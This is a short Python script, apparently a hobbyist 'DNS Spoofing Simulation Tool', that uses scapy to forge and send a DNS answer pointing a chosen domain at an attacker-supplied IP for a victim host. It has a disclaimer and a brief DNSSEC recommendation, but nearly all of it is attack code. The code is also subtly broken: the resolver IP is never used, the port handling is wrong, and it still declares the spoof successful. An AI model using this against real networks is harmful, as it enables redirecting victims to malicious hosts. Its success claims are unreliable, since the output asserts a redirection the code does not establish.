from scapy.all import *
import time
import random

def dns_spoof(victim_ip, dns_server_ip, domain, fake_ip):
    """
    Simulates DNS Spoofing attack by sending a forged DNS response.
    victim_ip: Victim's IP address
    dns_server_ip: DNS resolver's IP
    domain: The domain to spoof (e.g., www.example.com)
    fake_ip: The fake IP to redirect to
    """
    # Craft a DNS response with a fake IP
    dns_response = IP(dst=victim_ip)/UDP(dport=53)/DNS(id=random.randint(1, 65535), qr=1, 
                                                  qd=DNSQR(qname=domain, qtype="A"), 
                                                  an=DNSRR(rrname=domain, ttl=10, rdata=fake_ip))
    
    # Send the fake DNS response to the victim
    send(dns_response, verbose=0)
    
    # Print what the victim is spoofed to (to verify)
    print(f"DNS Spoofed! {domain} is now pointing to {fake_ip} for victim {victim_ip}")

def main():
    # Display disclaimer
    print("===================================")
    print("Disclaimer: This tool is for educational and ethical purposes only.")
    print("By running this tool, you agree not to use it for malicious activities.")
    print("Any illegal use of this tool is the sole responsibility of the user.")
    print("===================================")
    print("\nTool developed by: Sujal Lamichhane\n")
    time.sleep(2)  # Wait for a few seconds before continuing
    print("Proceeding with the DNS Spoofing Simulation Tool...\n")
    time.sleep(2)

    # Ask user for the victim's IP address, default gateway, and domain details
    victim_ip = input("Enter Victim's IP Address: ")
    dns_server_ip = input("Enter DNS Server's IP Address (Default Gateway): ")
    domain = input("Enter Domain to Spoof (e.g., www.example.com): ")
    fake_ip = input("Enter Fake IP Address to Redirect to (e.g., 192.168.1.100): ")

    print("\nSimulating DNS Spoofing Attack...\n")
    time.sleep(1)

    # Simulate DNS Spoofing Attack
    dns_spoof(victim_ip, dns_server_ip, domain, fake_ip)

    print("\nDNS Spoofing Attack simulation complete!")
    print(f"\nWhen {victim_ip} tries to access {domain}, it will be redirected to {fake_ip}.\n")
    print("Recommendations: ")
    print("- Enable DNSSEC to secure DNS responses.")
    print("- Use trusted DNS resolvers.")
    
if __name__ == "__main__":
    main()
